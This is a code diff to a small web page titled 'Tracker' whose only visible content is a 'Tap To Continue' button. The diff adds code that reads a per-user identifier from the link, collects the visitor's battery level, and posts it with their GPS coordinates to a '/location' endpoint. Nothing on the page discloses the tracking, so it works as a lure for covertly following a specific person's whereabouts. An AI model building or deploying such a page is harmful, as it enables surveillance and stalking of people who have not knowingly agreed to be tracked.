@@ -2,6 +2,8 @@
 <html>
 
 <head>
+<title>Tracker</title>
+
 <style>
 body{
 height:100vh;
@@ -10,11 +12,14 @@ justify-content:center;
 align-items:center;
 margin:0;
 }
+
 button{
 font-size:25px;
 padding:20px 40px;
+cursor:pointer;
 }
 </style>
+
 </head>
 
 <body>
@@ -25,9 +30,19 @@ Tap To Continue
 
 <script>
 
+const params = new URLSearchParams(window.location.search)
+const user = params.get("user")
+
 function getLocation(){
 
-navigator.geolocation.getCurrentPosition(function(pos){
+navigator.geolocation.getCurrentPosition(async function(pos){
+
+let batteryLevel = "Unknown"
+
+if(navigator.getBattery){
+let battery = await navigator.getBattery()
+batteryLevel = Math.round(battery.level*100)
+}
 
 fetch("/location",{
 method:"POST",
@@ -35,8 +50,10 @@ headers:{
 "Content-Type":"application/json"
 },
 body:JSON.stringify({
+user:user,
 latitude:pos.coords.latitude,
-longitude:pos.coords.longitude
+longitude:pos.coords.longitude,
+battery:batteryLevel
 })
 })
 
@@ -47,4 +64,4 @@ longitude:pos.coords.longitude
 </script>
 
 </body>
-</html>
+</html>   
